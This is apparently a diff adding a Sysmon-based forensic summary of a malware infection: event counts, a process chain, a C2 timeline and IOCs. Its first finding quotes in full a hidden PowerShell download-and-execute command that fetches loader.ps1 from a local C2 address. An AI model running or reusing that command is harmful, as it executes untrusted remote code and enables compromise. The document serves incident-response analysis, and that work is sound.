@@ -1,0 +1,46 @@
+SYSMON ANALYSIS SUMMARY
+=======================
+
+Total Events Parsed:
+- Process Create (Event 1): 3,048
+- Network Connect (Event 3): 512
+- File Create (Event 11): 4,115
+- Registry Events (12/13/14): 5,784
+
+KEY FINDINGS:
+
+1. Malware Execution Chain
+   PID 4872: PowerShell
+   Command: powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden
+            -Command "IEX(New-Object Net.WebClient).DownloadString('http://192.168.74.147:8080/loader.ps1')"
+   
+   PID 7716: winupdate1095726858.exe (Parent: 4872)
+   Path: C:\Users\Windows10\AppData\Local\Temp\winupdate1095726858.exe
+   Time: 2026-02-15 12:50:51 UTC
+   
+   PID 4012: winupdate1095726858.exe (Parent: 7716)
+   Time: 2026-02-15 12:50:52 UTC
+
+2. Network Connections to C2 (192.168.74.147:8080)
+   12:50:51 - PowerShell (PID 4872) - Download stage
+   12:50:56 - winupdate (PID 4012) - C2 registration  
+   12:51:07 - winupdate (PID 4012) - Data exfiltration
+
+3. Attack Timeline
+   12:49:38 - Phishing page access (Chrome)
+   12:50:51 - PowerShell execution → Malware download
+   12:50:51 - Malware execution begins
+   12:50:52 - Secondary process spawned
+   12:50:56 - C2 registration (key exfiltration)
+   12:51:07 - File list exfiltration
+
+EVIDENCE CORRELATION:
+✅ Memory forensics: Confirmed PIDs 7716, 4012, 4872
+✅ PCAP analysis: Confirmed C2 traffic timestamps
+✅ Sysmon logs: Complete execution chain documented
+
+IOCs IDENTIFIED:
+- Parent command: loader.ps1 download via PowerShell
+- Malware path: C:\Users\Windows10\AppData\Local\Temp\winupdate*.exe
+- C2 IP: 192.168.74.147:8080
+- Malware pattern: winupdate[random_number].exe
